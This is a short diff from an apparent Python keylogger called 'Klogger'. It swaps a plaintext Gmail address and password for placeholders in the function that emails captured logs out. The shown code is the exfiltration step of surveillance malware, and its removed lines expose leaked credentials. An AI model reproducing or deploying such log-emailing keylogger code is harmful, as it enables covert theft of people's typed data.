@@ -13,10 +13,10 @@ from apscheduler.schedulers.blocking import BlockingScheduler
 # This email is open to testing purposes for the next 2 weeks
 ###############
 def sendLog(log):
-    sender_email = "kloggertest42069@gmail.com" #Insert your email here
-    receiver_email = "kloggertest42069@gmail.com" #and here
-    subject = "Klogger"
-    sender_password = "rotkiv1234" #email password here
+    sender_email = "example@example.com" #Insert your email here
+    receiver_email = "example@example.com" #and here
+    subject = "Klogger" #Subject of the email
+    sender_password = "examplepassword" #email password here
 
     yag = yagmail.SMTP(user=sender_email, password=sender_password)
 
